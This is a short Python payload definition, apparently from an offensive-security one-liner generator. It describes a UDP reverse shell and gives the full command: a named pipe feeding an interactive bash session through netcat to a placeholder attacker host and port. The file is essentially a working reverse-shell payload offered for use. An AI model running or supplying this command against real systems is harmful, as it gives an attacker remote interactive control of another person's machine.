class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Establish a udp reverse connection with netcat."
    function    = "reverse shell"
    liner       = """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""
